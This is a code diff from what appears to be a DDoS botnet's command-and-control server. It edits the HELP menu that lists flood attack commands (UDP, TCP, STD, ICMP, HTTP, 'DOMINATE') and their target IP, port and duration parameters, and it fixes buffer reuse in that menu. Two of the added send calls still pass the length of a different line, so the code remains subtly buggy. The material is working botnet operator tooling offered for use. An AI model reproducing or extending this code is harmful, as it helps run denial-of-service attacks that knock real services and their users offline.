@@ -514,19 +514,23 @@ if(strstr(buf, "HELP")) {
 				char ddosline3  [80];
 				char ddosline4  [80];
 				char ddosline5  [80];
-				sprintf(ddosline1, "\x1b[1;37m !* UDP [IP] [PORT] [TIME] [PACKETSIZE] [POLL INTERVAL] | UDP FLOOD\r\n");
-				sprintf(ddosline2, "\x1b[1;37m !* STD [IP] [PORT] [TIME] | STD FLOOD\r\n");
+				char ddosline6  [80];
+				char ddosline7  [80];
+				sprintf(ddosline1, "\x1b[1;37m !* UDP [IP] [PORT] [TIME] [PACKETSIZE] [POLL INTERVAL]             | UDP FLOOD\r\n");
+				sprintf(ddosline2, "\x1b[1;37m !* STD [IP] [PORT] [TIME]                                          | STD FLOOD\r\n");
 				sprintf(ddosline3, "\x1b[1;37m !* TCP [IP] [PORT] [TIME] [FLAGS all] [PACKETSIZE] [POLL INTERVAL] | TCP FLOOD\r\n");
-				sprintf(ddosline3, "\x1b[1;37m !* DOMINATE [IP] [PORT] [TIME] [POLL INTERVAL] | DOMINATE FLOOD\r\n");
-				sprintf(ddosline3, "\x1b[1;37m !* ICMP [IP] [TIME] [POLL INTERVAL] | ICMP FLOOD\r\n");
-				sprintf(ddosline4, "\x1b[1;37m !* HTTP [METHOD] [IP] [PORT] [PATH] [TIME] [POWER] | HTTP FLOOD\r\n");
-				sprintf(ddosline5, "\x1b[1;37m !* KILLATTK | KILLS ALL ATTACKS\r\n");
+				sprintf(ddosline4, "\x1b[1;37m !* DOMINATE [IP] [PORT] [TIME] [POLL INTERVAL]                     | DOMINATE FLOOD\r\n");
+				sprintf(ddosline5, "\x1b[1;37m !* ICMP [IP] [TIME] [POLL INTERVAL]                                | ICMP FLOOD\r\n");
+				sprintf(ddosline6, "\x1b[1;37m !* HTTP [METHOD] [IP] [PORT] [PATH] [TIME] [POWER]                 | HTTP FLOOD\r\n");
+				sprintf(ddosline7, "\x1b[1;37m !* KILLATTK                                                        | KILLS ALL ATTACKS\r\n");
 
 				if(send(thefd, ddosline1,  strlen(ddosline1),	MSG_NOSIGNAL) == -1) goto end;
 				if(send(thefd, ddosline2,  strlen(ddosline2),	MSG_NOSIGNAL) == -1) goto end;
 				if(send(thefd, ddosline3,  strlen(ddosline3),	MSG_NOSIGNAL) == -1) goto end;
 				if(send(thefd, ddosline4,  strlen(ddosline4),	MSG_NOSIGNAL) == -1) goto end;
 				if(send(thefd, ddosline5,  strlen(ddosline5),	MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, ddosline6,  strlen(ddosline5),	MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, ddosline7,  strlen(ddosline5),	MSG_NOSIGNAL) == -1) goto end;
 				pthread_create(&title, NULL, &titleWriter, sock);
 				while(1) {
 				if(send(thefd, "\x1b[1;32m> \x1b[1;37m", 12, MSG_NOSIGNAL) == -1) goto end;
